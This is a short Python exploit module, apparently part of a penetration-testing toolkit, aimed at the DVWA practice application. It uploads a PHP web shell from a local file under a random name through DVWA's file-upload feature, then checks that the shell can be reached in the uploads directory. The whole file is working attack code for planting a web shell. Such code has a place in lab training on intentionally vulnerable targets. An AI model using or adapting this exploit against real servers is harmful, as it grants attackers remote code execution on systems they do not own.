
import requests
import random
from urllib.parse import urljoin , urlparse , urlencode
from core.common import *

def exploit(url,cookies = {}):
    print("\nTry Dvwa Upload exploit :")

    print("\tUpload shell :")
    shell_name = str(random.randint(11111,99999)) + '.php'
    payload = open('tools/shell.php','r').read()
    
    if upload_file(url,cookies,shell_name,payload):
        shell_path = urljoin(url, 'hackable/uploads/' + shell_name)
        check_exploit_succeed(shell_path,makeHeaders(urlparse(url).hostname),end='\t')

    else:
        print("\tFailed upload file !!")
